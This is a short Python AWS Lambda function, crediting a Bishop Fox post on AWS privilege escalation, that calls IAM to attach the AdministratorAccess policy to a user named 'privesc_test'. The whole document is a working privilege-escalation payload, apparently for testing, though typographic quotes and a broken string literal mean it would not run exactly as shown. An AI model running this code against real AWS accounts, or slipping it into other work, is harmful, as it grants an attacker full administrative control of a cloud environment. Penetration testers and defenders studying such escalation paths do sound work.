import boto3
#thank you bishop fox https://bishopfox.com/blog/privilege-escalation-in-aws
def lambda_handler(event, context):
  client = boto3.client(‘iam’)
  response = client.attach_user_policy(UserName=’privesc_
test’,PolicyArn=’arn:aws:iam::aws:policy/AdministratorAccess’)
  return response